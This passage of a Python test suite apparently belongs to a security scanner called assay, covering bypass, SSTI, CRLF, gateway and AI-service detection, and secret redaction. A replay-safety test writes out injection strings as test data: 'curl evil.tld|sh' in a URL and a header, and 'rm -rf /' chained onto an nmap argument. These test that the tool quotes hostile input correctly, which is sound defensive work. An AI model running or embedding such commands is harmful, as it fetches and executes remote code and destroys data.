        """`str(x or "")` silently blanks a zero, which reads as missing data."""
        import re
        html = self._build(self._store())
        tiles = re.findall(r'<div class="num"[^>]*>([^<]*)</div>', html)
        self.assertTrue(tiles, "no tiles rendered")
        self.assertNotIn("", tiles, "a tile rendered blank instead of a number")

    def test_every_severity_and_triage_renders(self):
        import os, tempfile
        from assay.models import Evidence, Finding
        from assay.store import Store
        s = Store(os.path.join(tempfile.mkdtemp(), "assay.db"))
        s.start_run("standard", ["t"])
        for sev in ("critical", "high", "medium", "low", "info"):
            s.add_finding(Finding(title="F " + sev, target="https://a/", severity=sev,
                                  confidence="firm", module="m", impact="i",
                                  evidence=[Evidence(kind="http", output="x")]))
        html = self._build(s)
        for sev in ("critical", "high", "medium", "low", "info"):
            self.assertIn("F " + sev, html)


class RegexBudgetTests(unittest.TestCase):
    """Patterns run against response bodies the target controls."""

    ADVERSARIAL = [
        "A" * 40000, ("a" * 500 + "!") * 40, "<" * 20000,
        "https://" + "a." * 2000 + "!", "'" * 5000, "x=" * 10000,
        "/" + "a/" * 5000, '"' + "b" * 20000, "0123456789" * 4000,
        '<script src="' + "a" * 3000,
    ]

    def _all_patterns(self):
        from assay import domains, redact, urls
        from assay.modules import secrets, web_exposure, web_sqli
        pats = []
        for mod, names in ((urls, "JS_PATH_RE JS_URL_RE JS_CALL_RE ASSET_RE JS_NOISE_RE"),
                           (domains, "CSP_HOST_RE"),
                           (secrets, "INTERNAL_HOST_RE SCRIPT_RE SOURCEMAP_RE")):
            for n in names.split():
                pats.append((n, getattr(mod, n)))
        pats += [(e, r) for e, r in web_sqli.DB_ERRORS]
        pats += [(l, r) for l, _s, r, _w in secrets.SECRET_PATTERNS]
        pats += [(k, r) for k, r in redact.DETECTORS + redact.NETWORK_DETECTORS]
        pats += [(sig["path"], sig["_re"]) for sig in web_exposure.load_signatures()]
        return pats

    def test_no_pattern_backtracks_catastrophically(self):
        import time
        slow = []
        for name, rx in self._all_patterns():
            for body in self.ADVERSARIAL:
                t0 = time.time()
                rx.search(body)
                dt = time.time() - t0
                if dt > 0.25:
                    slow.append((name, round(dt, 2)))
        self.assertEqual(slow, [], "catastrophic backtracking: %s" % slow)


class ConcurrencyTests(unittest.TestCase):
    def test_url_pool_respects_the_cap_under_contention(self):
        import threading
        from assay.config import Config
        from assay.context import Context

        class _S:
            def add_finding(self, f): return True
        ctx = Context(cfg=Config(), store=_S(), http=None, tune={})
        threads = [threading.Thread(
            target=lambda n=i: ctx.add_urls(
                "https://a", ["https://a/%d" % k for k in range(n, n + 40)], 50))
            for i in range(0, 80, 5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        bucket = ctx.urls["https://a"]
        self.assertLessEqual(len(bucket), 50)
        self.assertEqual(len(bucket), len(set(bucket)), "duplicates leaked in")


class ReplaySafetyTests(unittest.TestCase):
    def test_target_controlled_values_cannot_inject_into_replay(self):
        """replay.sh is executable; URLs and headers come from the target."""
        import tempfile
        from assay.journal import Journal
        j = Journal(tempfile.mkdtemp())
        j.open(["t"], "standard")
        j.request("GET", "https://a.test/x';curl evil.tld|sh;#",
                  {"X-H": "v'; curl evil.tld | sh; #"})
        j.command(["nmap", "-sV", "10.0.0.1; rm -rf /"])
        j.close()
        replay = open(j.replay_path).read()
        for line in replay.splitlines():
            if line.startswith("#") or not line.strip():
                continue
            # Every metacharacter must sit inside a quoted string.
            import shlex
            tokens = shlex.split(line)
            self.assertNotIn("sh", [t.strip() for t in tokens[1:] if t == "sh"],
                             "a bare 'sh' token means the quoting failed")
        self.assertIn("'10.0.0.1; rm -rf /'", replay)


class BypassTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"

    def _ctx_with(self, allow):
        """allow(path, headers, method) -> True when the guard is bypassed."""
        def route(m, url, h, b):
            path = urlsplit(url).path
            if not path.startswith("/admin"):
                return None
            if allow(path, h, m):
                return 200, {"Content-Type": "text/html"}, \
                    "<html><h1>Admin console</h1>" + ("panel " * 80) + "</html>"
            return 403, {"Content-Type": "text/html"}, \
                "<html><h1>Forbidden</h1></html>"
        return make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/admin"]})

    def test_path_trick_bypass_is_found(self):
        from assay.modules.web_bypass import ForbiddenBypassModule
        ctx, _ = self._ctx_with(lambda p, h, m: p != "/admin")
        found = ForbiddenBypassModule().run_web(ctx, web_target())
        self.assertTrue(found, "a path-mutation bypass was missed")
        self.assertEqual(found[0].severity, "high")
        self.assertEqual(found[0].confidence, "confirmed")
        self.assertEqual(len(found[0].evidence), 2, "denial and bypass both needed")

    def test_header_trick_bypass_is_found(self):
        from assay.modules.web_bypass import ForbiddenBypassModule
        ctx, _ = self._ctx_with(
            lambda p, h, m: h.get("X-Forwarded-For") == "127.0.0.1")
        found = ForbiddenBypassModule().run_web(ctx, web_target())
        self.assertTrue(found)
        self.assertIn("header", found[0].title)

    def test_consistently_forbidden_path_reports_nothing(self):
        from assay.modules.web_bypass import ForbiddenBypassModule
        ctx, _ = self._ctx_with(lambda p, h, m: False)
        self.assertEqual(ForbiddenBypassModule().run_web(ctx, web_target()), [])

    def test_login_page_returned_with_200_is_not_a_bypass(self):
        """Plenty of guards answer 200 with a sign-in page."""
        from assay.modules.web_bypass import ForbiddenBypassModule

        def route(m, url, h, b):
            if not urlsplit(url).path.startswith("/admin"):
                return None
            if urlsplit(url).path == "/admin":
                return 403, {"Content-Type": "text/html"}, "<h1>Forbidden</h1>"
            return 200, {"Content-Type": "text/html"}, \
                "<html><title>Sign in</title><form>" + ("x " * 90) + "</form></html>"
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/admin"]})
        self.assertEqual(ForbiddenBypassModule().run_web(ctx, web_target()), [])


class SstiTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"

    def test_evaluated_arithmetic_is_reported(self):
        from assay.modules.web_inject import SstiModule
        import re as _re

        def route(m, url, h, b):
            v = parse_qs(urlsplit(url).query).get("q", [""])[0]
            # A real Jinja-style engine: evaluate {{a*b}}.
            out = _re.sub(r"\{\{(\d+)\*(\d+)\}\}",
                          lambda mm: str(int(mm.group(1)) * int(mm.group(2))), v)
            return 200, {"Content-Type": "text/html"}, "<p>%s</p>" % out
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/s?q=x"]})
        found = SstiModule().run_web(ctx, web_target())
        self.assertTrue(found, "evaluated template expression was missed")
        self.assertEqual(found[0].severity, "critical")

    def test_echoed_payload_is_not_ssti(self):
        """Reflection without evaluation is not template injection."""
        from assay.modules.web_inject import SstiModule

        def route(m, url, h, b):
            v = parse_qs(urlsplit(url).query).get("q", [""])[0]
            return 200, {"Content-Type": "text/html"}, "<p>%s</p>" % v
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/s?q=x"]})
        self.assertEqual(SstiModule().run_web(ctx, web_target()), [])

    def test_page_containing_the_number_by_chance_is_not_ssti(self):
        from assay.modules.web_inject import SstiModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "text/html"}, "<p>total 5131 items</p>"
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/s?q=x"]})
        self.assertEqual(SstiModule().run_web(ctx, web_target()), [])


class CrlfTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"

    def test_injected_header_is_reported(self):
        from assay.modules.web_inject import CrlfModule
        from urllib.parse import unquote

        def route(m, url, h, b):
            v = unquote(parse_qs(urlsplit(url).query).get("url", [""])[0])
            hdrs = {"Content-Type": "text/html"}
            if "\r\n" in v or "\n" in v:
                for line in v.replace("\r\n", "\n").split("\n")[1:]:
                    if ":" in line:
                        k, _, val = line.partition(":")
                        hdrs[k.strip()] = val.strip()
            return 200, hdrs, "ok"
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/r?url=x"]})
        found = CrlfModule().run_web(ctx, web_target())
        self.assertTrue(found, "header injection was missed")
        self.assertEqual(found[0].confidence, "confirmed")

    def test_sanitised_input_reports_nothing(self):
        from assay.modules.web_inject import CrlfModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "text/html"}, "ok"
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/r?url=x"]})
        self.assertEqual(CrlfModule().run_web(ctx, web_target()), [])


class GatewayTests(unittest.TestCase):
    """Where all 80/443 traffic is proxied, every address answers."""

    PROXY = "<html><head><title>Gateway</title></head><body>No route.</body></html>"

    def _wt(self, host, body, **kw):
        from assay.models import WebTarget
        w = WebTarget(url="https://%s/" % host, host=host, port=443,
                      scheme="https", status=kw.get("status", 200),
                      server=kw.get("server", "nginx"), title=kw.get("title", ""),
                      content_type="text/html")
        w.body_sample = body
        return w

    def test_uniform_proxy_response_is_detected_and_filtered(self):
        from assay import gateway
        web = [self._wt("10.20.0.%d" % i, self.PROXY) for i in range(1, 41)]
        web.append(self._wt("10.20.0.90",
                            "<html>" + "Real application " * 40 + "</html>",
                            title="Portal"))
        v = gateway.detect(web)
        self.assertTrue(v.detected)
        self.assertEqual([w.host for w in gateway.filter_web(web, v)],
                         ["10.20.0.90"])

    def test_a_real_load_balanced_pool_is_not_filtered(self):
        from assay import gateway
        pool = [self._wt("10.20.1.%d" % i, "<html>" + "Real app " * 50 + "</html>",
                         title="App") for i in range(1, 7)]
        pool += [self._wt("10.20.1.%d" % i, "<html>different %d</html>" % i,
                          title="Other %d" % i) for i in range(20, 40)]
        self.assertFalse(gateway.detect(pool).detected)

    def test_asserted_mode_is_more_sensitive_but_not_reckless(self):
        """Asserted lowers the bar; it does not remove it.

        Two matching hosts must never be enough, or a two-node load-balanced
        pool gets filtered away as though it were the gateway.
        """
        from assay import gateway
        two = [self._wt("10.0.0.1", self.PROXY), self._wt("10.0.0.2", self.PROXY),
               self._wt("10.0.0.3", "<html>" + "Real " * 60 + "</html>",
                        title="App")]
        self.assertFalse(gateway.detect(two, asserted=True).detected,
                         "2 matching hosts is not enough evidence")

        three = two + [self._wt("10.0.0.4", self.PROXY)]
        v = gateway.detect(three, asserted=True)
        self.assertTrue(v.detected, "3 of 4 should conclude in asserted mode")
        self.assertEqual([w.host for w in gateway.filter_web(three, v)],
                         ["10.0.0.3"])

    def test_proxied_ports_are_not_reported_as_exposed_services(self):
        from assay.config import Config
        from assay.context import Context
        from assay.models import Port, Target
        from assay.modules.host_services import ServiceTriageModule

        class _S:
            def add_finding(self, f): return True
        cfg = Config(proxied_ports=[80, 443])
        ctx = Context(cfg=cfg, store=_S(), http=None, tune={})
        t = Target(raw="10.0.0.1", host="10.0.0.1", ip="10.0.0.1")
        t.ports = [Port(port=443, service="https"), Port(port=21, service="ftp")]
        titles = [f.title for f in ServiceTriageModule().run_host(ctx, t)]
        self.assertFalse(any("443" in x for x in titles),
                         "a proxied port was reported as a service")
        self.assertTrue(any("ftp" in x for x in titles),
                        "a real service must still be reported")

    def test_too_few_hosts_to_conclude(self):
        from assay import gateway
        self.assertFalse(gateway.detect(
            [self._wt(h, self.PROXY) for h in ("a.tld", "b.tld", "c.tld")]).detected)

    def test_several_ports_on_one_host_are_not_evidence(self):
        from assay import gateway
        from assay.models import WebTarget
        web = []
        for port in (80, 443, 8080, 8443, 9000, 9443):
            w = WebTarget(url="https://a.tld:%d/" % port, host="a.tld", port=port,
                          scheme="https", status=200, content_type="text/html")
            w.body_sample = self.PROXY
            web.append(w)
        self.assertFalse(gateway.detect(web).detected)


class TriageStatusTests(unittest.TestCase):
    def _store(self):
        import os, tempfile
        from assay.models import Evidence, Finding
        from assay.store import Store
        s = Store(os.path.join(tempfile.mkdtemp(), "assay.db"))
        s.start_run("standard", ["t"])
        for t in ("Exposed .env", "CORS reflect", "Open redirect"):
            s.add_finding(Finding(title=t, target="https://a/" + t[:3],
                                  severity="high", confidence="firm", module="m",
                                  impact="i",
                                  evidence=[Evidence(kind="http", output="x")]))
        return s

    def test_status_persists_and_mutes(self):
        s = self._store()
        fid = s.findings()[0].fingerprint()
        s.set_status(fid, "reported", notes="submitted")
        self.assertEqual(s.status_of(fid), "reported")
        self.assertEqual(len(s.findings()), 3)
        self.assertEqual(len(s.findings(include_muted=False)), 2)

    def test_muted_findings_do_not_resurface_in_diff(self):
        s = self._store()
        fid = s.findings()[0].fingerprint()
        title = s.findings()[0].title
        s.set_status(fid, "duplicate")
        self.assertNotIn(title, [f.title for f in s.diff()["new_findings"]])

    def test_in_progress_is_not_muted(self):
        """Marking something as being worked must not hide it."""
        s = self._store()
        fid = s.findings()[0].fingerprint()
        s.set_status(fid, "in-progress")
        self.assertEqual(len(s.findings(include_muted=False)), 3)


class LivenessTests(unittest.TestCase):
    """On a proxied network an open port and an HTTP response prove nothing.

    What still separates a real service from the gateway is the content.
    """

    def test_gateway_errors_are_not_a_service(self):
        from assay.gateway import looks_live
        for status in (502, 503, 504):
            live, why = looks_live(status, "<html>Service Unavailable</html>")
            self.assertFalse(live, "HTTP %d treated as a live service" % status)
            self.assertIn("backend", why)

    def test_empty_body_is_not_a_service(self):
        from assay.gateway import looks_live
        for body in ("", "   ", "\n\n  \t"):
            self.assertFalse(looks_live(200, body)[0])

    def test_real_content_is_a_service(self):
        from assay.gateway import looks_live
        live, _ = looks_live(200, "<html><body>Real application</body></html>")
        self.assertTrue(live)

    def test_a_guarded_endpoint_is_still_a_service(self):
        """401/403 means something is there and is protecting itself."""
        from assay.gateway import looks_live
        self.assertTrue(looks_live(401, "<html>Authentication required</html>")[0])
        self.assertTrue(looks_live(403, "<html>Forbidden</html>")[0])

    def test_no_response_is_not_a_service(self):
        from assay.gateway import looks_live
        self.assertFalse(looks_live(0, "")[0])


class NonStandardPortTests(unittest.TestCase):
    def test_web_on_an_unrecognised_port_is_probed(self):
        """A site on 7777 with no service banner used to be invisible."""
        from assay.engine import NON_HTTP_SERVICES
        for port, svc in ((7777, ""), (31337, "unknown"), (9443, ""),
                          (5000, "upnp"), (2375, "")):
            self.assertFalse(svc and svc in NON_HTTP_SERVICES,
                             "port %d would be skipped" % port)

    def test_definitively_non_http_services_are_skipped(self):
        from assay.engine import NON_HTTP_SERVICES
        for svc in ("ssh", "mysql", "postgresql", "domain", "smtp", "vnc"):
            self.assertIn(svc, NON_HTTP_SERVICES)

    def test_http_services_are_never_in_the_skip_list(self):
        from assay.engine import HTTP_SERVICES, NON_HTTP_SERVICES
        self.assertEqual(HTTP_SERVICES & NON_HTTP_SERVICES, set())


class GatewayThresholdTests(unittest.TestCase):
    def _wt(self, host, body, title=""):
        from assay.models import WebTarget
        w = WebTarget(url="https://%s/" % host, host=host, port=443,
                      scheme="https", status=200, server="nginx", title=title,
                      content_type="text/html")
        w.body_sample = body
        return w

    def test_asserted_mode_does_not_eat_a_two_node_pool(self):
        """Two identical real servers must not be mistaken for the gateway."""
        from assay import gateway
        pool = [self._wt("10.0.0.%d" % i, "<html>" + "Real app " * 40 + "</html>",
                         title="App") for i in (1, 2)]
        v = gateway.detect(pool, asserted=True)
        self.assertFalse(v.detected,
                         "a 2-node load-balanced pool was filtered as a gateway")

    def test_asserted_mode_still_catches_a_real_gateway(self):
        from assay import gateway
        proxy = "<html><title>Gateway</title><body>No route.</body></html>"
        web = [self._wt("10.0.0.%d" % i, proxy) for i in range(1, 9)]
        web.append(self._wt("10.0.0.90", "<html>" + "Real " * 60 + "</html>",
                            title="App"))
        v = gateway.detect(web, asserted=True)
        self.assertTrue(v.detected)
        self.assertEqual([w.host for w in gateway.filter_web(web, v)],
                         ["10.0.0.90"])

    def test_asserted_is_more_sensitive_than_inferred_but_still_needs_a_majority(self):
        from assay import gateway
        proxy = "<html><title>Gateway</title><body>No route.</body></html>"
        web = [self._wt("10.0.0.%d" % i, proxy) for i in (1, 2, 3)]
        web.append(self._wt("10.0.0.9", "<html>" + "Real " * 60 + "</html>"))
        self.assertFalse(gateway.detect(web).detected, "inferred needs 5")
        self.assertTrue(gateway.detect(web, asserted=True).detected,
                        "asserted should conclude at 3 of 4")


class AiSurfaceTests(unittest.TestCase):
    """AI infrastructure ships unauthenticated and is now widely deployed."""

    def _target(self, *ports):
        from assay.models import Port, Target
        t = Target(raw="10.0.0.5", host="10.0.0.5", ip="10.0.0.5")
        t.ports = [Port(port=p, service="") for p in ports]
        return t

    def test_ollama_is_detected_from_its_model_list(self):
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([path_route(
            "/api/tags", ctype="application/json",
            body='{"models":[{"name":"llama3:8b","size":4661224676}]}')])
        found = AiSurfaceModule().run_host(ctx, self._target(11434))
        self.assertTrue(found, "exposed Ollama was missed")
        self.assertIn("Ollama", found[0].title)
        self.assertEqual(found[0].confidence, "confirmed")
        self.assertIn("Confidentiality", found[0].detail)

    def test_outdated_ollama_is_escalated_to_critical(self):
        """A version below the CVE-2026-7482 fix changes the severity."""
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([
            path_route("/api/tags", ctype="application/json",
                       body='{"models":[{"name":"llama3"}]}'),
            path_route("/api/version", ctype="application/json",
                       body='{"version":"0.16.4"}')])
        found = AiSurfaceModule().run_host(ctx, self._target(11434))
        self.assertEqual(found[0].severity, "critical")
        self.assertIn("CVE-2026-7482", found[0].impact)
        self.assertIn("cve-2026-7482", found[0].tags)

    def test_patched_ollama_stays_high_not_critical(self):
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([
            path_route("/api/tags", ctype="application/json",
                       body='{"models":[{"name":"llama3"}]}'),
            path_route("/api/version", ctype="application/json",
                       body='{"version":"0.17.4"}')])
        found = AiSurfaceModule().run_host(ctx, self._target(11434))
        self.assertEqual(found[0].severity, "high")
        self.assertNotIn("CVE-2026-7482", found[0].impact)

    def test_vllm_openai_endpoint_detected(self):
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([path_route(
            "/v1/models", ctype="application/json",
            body='{"object":"list","data":[{"id":"m","owned_by":"vllm"}]}')])
        found = AiSurfaceModule().run_host(ctx, self._target(8000))
        self.assertTrue(any("OpenAI-compatible" in f.title for f in found))

    def test_qdrant_detected(self):
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([path_route(
            "/collections", ctype="application/json",
            body='{"result":{"collections":[{"name":"docs"}]},"status":"ok"}')])
        found = AiSurfaceModule().run_host(ctx, self._target(6333))
        self.assertTrue(any("Qdrant" in f.title for f in found))
        self.assertEqual(found[0].severity, "high")

    def test_ray_dashboard_is_critical(self):
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([path_route(
            "/api/version", ctype="application/json",
            body='{"ray_version":"2.9.0","ray_commit":"abc"}')])
        found = AiSurfaceModule().run_host(ctx, self._target(8265))
        self.assertTrue(found)
        self.assertEqual(found[0].severity, "critical")

    def test_an_ordinary_web_app_on_a_shared_port_is_not_claimed(self):
        """Port 8000 is vLLM, ChromaDB, Triton and a thousand dev servers."""
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([])   # catch-all HTML shell
        self.assertEqual(AiSurfaceModule().run_host(ctx, self._target(8000)), [])

    def test_closed_ports_are_not_probed(self):
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, http = make_ctx([path_route(
            "/api/tags", ctype="application/json", body='{"models":[]}')])
        self.assertEqual(AiSurfaceModule().run_host(ctx, self._target(22)), [])

    def test_ai_ports_are_always_scanned(self):
        """11434 and 8265 are outside nmap's top-1000; a default scan misses them."""
        from assay.engine import AI_PORTS, Engine
        from assay.tools import nmap_extra_port_args, nmap_port_args
        for profile_spec in ("top-100", "top-1000"):
            spec = Engine._with_ai_ports(profile_spec)
            # --top-ports and -p combined in one nmap call is an intersection,
            # not a union (nmap/nmap#447), so the AI ports must show up in the
            # separate extra-ports invocation rather than the base one.
            args = " ".join(nmap_port_args(spec) + (nmap_extra_port_args(spec) or []))
            for port in (11434, 8265, 6333):
                self.assertIn(str(port), args,
                              "port %d absent from %s" % (port, profile_spec))
        self.assertEqual(Engine._with_ai_ports("all"), "all",
                         "a full scan needs no additions")

    def test_nmap_never_combines_top_ports_with_dash_p(self):
        """nmap treats --top-ports + -p as an intersection, not a union (nmap/nmap#447)."""
        from assay.engine import Engine
        from assay.tools import nmap_extra_port_args, nmap_port_args
        for profile_spec in ("top-100", "top-1000"):
            spec = Engine._with_ai_ports(profile_spec)
            base = nmap_port_args(spec)
            self.assertNotIn("-p", base,
                             "base args must not mix --top-ports with -p: %s" % base)
            extra = nmap_extra_port_args(spec)
            self.assertEqual(extra[0], "-p")
            self.assertNotIn("--top-ports", extra)

    def test_naabu_never_passes_list_dash_for_stdin(self):
        """naabu 2.4.0 takes '-list -' literally and tries to open a file
        named '-', failing with [FTL] Could not run enumeration: open -: no
        such file or directory. -list must always be a real, existing file -
        one this function wrote itself and that names the hosts asked for,
        never the literal string "-"."""
        from assay import tools
        seen_cmds = []
        seen_contents = []
        original = tools.stream_json

        def fake_stream_json(cmd, timeout=900.0, ledger=True):
            seen_cmds.append(list(cmd))
            # The file is only guaranteed to exist for as long as this
            # generator is being drained - _target_list_file deletes it the
            # moment the caller's `with` block exits, right after this
            # returns. Read it now, not after naabu_scan() has returned.
            path = cmd[cmd.index("-list") + 1] if "-list" in cmd else None
            if path:
                with open(path) as fh:
                    seen_contents.append(fh.read().split())
            return iter(())

        tools.stream_json = fake_stream_json
        try:
            tools.naabu_scan(["10.0.0.1", "10.0.0.2"], "top-1000", {})
        finally:
            tools.stream_json = original
        self.assertTrue(seen_cmds)
        for cmd in seen_cmds:
            self.assertIn("-list", cmd)
            self.assertNotEqual(cmd[cmd.index("-list") + 1], "-")
        self.assertEqual(seen_contents, [["10.0.0.1", "10.0.0.2"]])

    def test_service_ports_are_covered_by_discovery(self):
        from assay.engine import AI_PORTS, WEB_PORTS
        from assay.modules.ai_surface import load_services
        covered = set(AI_PORTS) | set(WEB_PORTS)
        missing = sorted({p for s in load_services() for p in s["ports"]} - covered)
        self.assertEqual(missing, [],
                         "these service ports would never be discovered: %s" % missing)

    def test_every_service_records_where_its_facts_came_from(self):
        """Ports and paths are easy to assert confidently and get wrong.

        Each signature carries provenance so a reader can tell a documented
        fact from a remembered one. Because matching is on content rather than
        port, a wrong value costs a missed detection, never a false positive.
        """
        from assay.modules.ai_surface import load_services
        missing = [s["name"] for s in load_services() if not s.get("verified")]
        self.assertEqual(missing, [],
                         "no provenance recorded for: %s" % missing)

    def test_no_signature_targets_a_post_only_endpoint(self):
        """A GET probe against a POST-only path can never fire.

        MLflow's experiments/search is POST-only and was written here as a GET,
        which is a silent gap rather than a visible failure.
        """
        from assay.modules.ai_surface import load_services
        post_only = ("experiments/search", "/query", "/search")
        offenders = [s["name"] for s in load_services()
                     if any(p in s["path"] for p in post_only)]
        self.assertEqual(offenders, [], "GET probe on a POST endpoint: %s" % offenders)

    def test_every_service_declares_impact_and_a_next_step(self):
        from assay.modules.ai_surface import load_services
        for s in load_services():
            self.assertTrue(s.get("impact"), "%s has no impact" % s["name"])
            self.assertTrue(s.get("step"), "%s has no repro step" % s["name"])
            self.assertTrue(s.get("cia"), "%s has no CIA mapping" % s["name"])
            self.assertTrue(s.get("match"), "%s would fire on a port alone" % s["name"])


class McpTests(unittest.TestCase):
    def _target(self, *ports):
        from assay.models import Port, Target
        t = Target(raw="10.0.0.6", host="10.0.0.6", ip="10.0.0.6")
        t.ports = [Port(port=p, service="") for p in ports]
        return t

    def test_mcp_handshake_is_detected(self):
        from assay.modules.ai_surface import McpModule

        def route(m, url, h, b):
            if m != "POST" or "initialize" not in (b or ""):
                return None
            return 200, {"Content-Type": "application/json"}, (
                '{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2025-06-18",'
                '"capabilities":{"tools":{},"resources":{}},'
                '"serverInfo":{"name":"filesystem-server","version":"1.0"}}}')
        ctx, _ = make_ctx([route])
        found = McpModule().run_host(ctx, self._target(3000))
        self.assertTrue(found, "MCP handshake was missed")
        self.assertEqual(found[0].severity, "critical")
        self.assertIn("tools", found[0].detail)
        self.assertIn("filesystem-server", found[0].detail)

    def test_a_plain_json_api_is_not_mcp(self):
        from assay.modules.ai_surface import McpModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "application/json"}, '{"status":"ok"}'
        ctx, _ = make_ctx([route])
        self.assertEqual(McpModule().run_host(ctx, self._target(3000)), [])

    def test_handshake_only_no_tool_is_ever_called(self):
        """Detection must not execute anything the server exposes."""
        from assay.modules.ai_surface import McpModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "application/json"}, (
                '{"result":{"protocolVersion":"2025-06-18","capabilities":{},'
                '"serverInfo":{"name":"s"}}}')
        ctx, http = make_ctx([route])
        McpModule().run_host(ctx, self._target(3000))
        bodies = [c for c in http.calls]
        self.assertTrue(all("tools/call" not in str(c) for c in bodies))


class JournalSecretTests(unittest.TestCase):
    """replay.sh is an executable file in the output folder.

    Writing engagement credentials into it is exactly the artefact you do not
    want left behind, so secret-bearing headers are referenced, never stored.
    """

    def _journal(self, headers):
        import tempfile
        from assay.journal import Journal
        j = Journal(tempfile.mkdtemp())
        j.open(["t"], "standard")
        j.request("GET", "https://target.tld/admin", headers)
        j.close()
        return j

    def test_basic_credentials_are_not_written_to_disk(self):
        from assay.config import Config
        cfg = Config(basic_auth="admin:hunter2")
        j = self._journal(cfg.request_headers())
        blob = open(j.replay_path).read() + open(j.log_path).read()
        self.assertNotIn("YWRtaW46aHVudGVyMg==", blob)
        self.assertNotIn("hunter2", blob)
        self.assertIn("${ASSAY_AUTH", open(j.replay_path).read())

    def test_cookies_and_api_keys_are_not_written(self):
        j = self._journal({"Cookie": "session=abc123secret",
                           "X-Api-Key": "live_key_9999"})
        blob = open(j.replay_path).read()
        self.assertNotIn("abc123secret", blob)
        self.assertNotIn("live_key_9999", blob)

    def test_nvd_apikey_header_is_not_written(self):
        """assay.cve sends NVD_API_KEY as a bare 'apiKey' header - a distinct
        name from 'X-Api-Key' above, and previously missing from
        SECRET_HEADERS, so it was written to replay.sh in cleartext whenever
        NVD_API_KEY was set. Found by checking assay.cve's actual header name
        against this list rather than assuming the existing entries covered
        it."""
        j = self._journal({"apiKey": "nvd-real-secret-0000"})
        blob = open(j.replay_path).read()
        self.assertNotIn("nvd-real-secret-0000", blob)
        self.assertIn("${ASSAY_NVD_KEY", blob)

    def test_ordinary_headers_are_still_recorded(self):
        """Redaction must not gut the replay's usefulness."""
        j = self._journal({"X-Trace": "ok", "Referer": "https://target.tld/"})
        blob = open(j.replay_path).read()
        self.assertIn("X-Trace: ok", blob)

    def test_journal_files_are_owner_only(self):
        import os, stat
        j = self._journal({"X-Trace": "ok"})
        self.assertEqual(stat.S_IMODE(os.stat(j.log_path).st_mode), 0o600)
        self.assertEqual(stat.S_IMODE(os.stat(j.replay_path).st_mode), 0o700)


class AiTriageFilePermissionTests(unittest.TestCase):
    """ai-triage.json is the *rehydrated* AI result - real hostnames and IPs
    are back in it, same as redaction-map.json, so it needs the same 0600
    treatment. It didn't have it: this locks in the fix.

    ai_mod.analyze and backend_status are monkeypatched to a canned
    success so this stays offline - no real Anthropic API call.
    """

    def test_ai_triage_json_is_written_owner_only(self):
        import argparse, os, stat, tempfile
        from assay import ai as ai_mod
        from assay import cli
        from assay.config import Config
        from assay.store import Store

        out_dir = tempfile.mkdtemp()
        s = Store(os.path.join(out_dir, "assay.db"))
        s.start_run("standard", ["10.0.0.5"])
        s.save_host("10.0.0.5", "10.0.0.5", {"ports": []})
        from assay.models import Evidence, Finding
        s.add_finding(Finding(
            title="x", target="10.0.0.5", severity="low", confidence="confirmed",
            module="m", category="c", cwe="", impact="i", detail="d", repro="r",
            evidence=[Evidence(kind="http", label="e", output="e")]))
        cfg = Config(out_dir=out_dir, targets=["10.0.0.5"])

        orig_analyze = ai_mod.analyze
        orig_cred = ai_mod.backend_status
        ai_mod.analyze = lambda *a, **k: {
            "summary": "10.0.0.5 looks fine.", "triage": [], "chains": [],
            "_usage": {"input_tokens": 10, "output_tokens": 10,
                      "cost_estimate_usd": 0.001},
        }
        ai_mod.backend_status = lambda cfg: (True, "test stub")
        try:
            args = argparse.Namespace(ai_model="claude-opus-4-8", ai_max=60,
                                      ai_evidence=False, ai_dry_run=False,
                                      ai_effort="high", ai_yes=True,
                                      ai_backend="api", ai_claude_bin="claude")
            cli.run_ai(s, cfg, args, {"hosts": 1, "web": 0})
        finally:
            ai_mod.analyze = orig_analyze
            ai_mod.backend_status = orig_cred

        path = os.path.join(out_dir, "ai-triage.json")
        self.assertTrue(os.path.exists(path))
        self.assertEqual(stat.S_IMODE(os.stat(path).st_mode), 0o600)


class AiBackendTests(unittest.TestCase):
    """There are two ways to reach Claude and assay must not pick one for you.

    Everything here is offline: the CLI backend is exercised by replacing
    subprocess.run with a canned envelope, so no real `claude` process starts
    and no request leaves the machine.
    """

    def _stub_resolve(self, ai_mod):
        """cli_status is stubbed, but resolve_cli still hits shutil.which; make
        the tests independent of whether `claude` is installed on this host."""
        orig = ai_mod.resolve_cli
        ai_mod.resolve_cli = lambda *a, **k: "/usr/bin/claude"
        self.addCleanup(setattr, ai_mod, "resolve_cli", orig)

    def _cfg(self, **kw):
        from assay.ai import AIConfig
        return AIConfig(enabled=True, **kw)

    def _one_finding(self):
        from assay.models import Evidence, Finding
        return [Finding(title="x", target="10.0.0.5", severity="low",
                        confidence="confirmed", module="m", category="c", cwe="",
                        impact="i", detail="d", repro="r",
                        evidence=[Evidence(kind="http", label="e", output="e")])]

    def test_analyze_refuses_without_a_backend(self):
        import tempfile
        from assay import ai as ai_mod
        from assay.redact import Redactor
        with self.assertRaises(ai_mod.BackendUnset):
            ai_mod.analyze(self._one_finding(), {}, self._cfg(),
                           Redactor(), tempfile.mkdtemp())

    def test_dry_run_needs_no_backend(self):
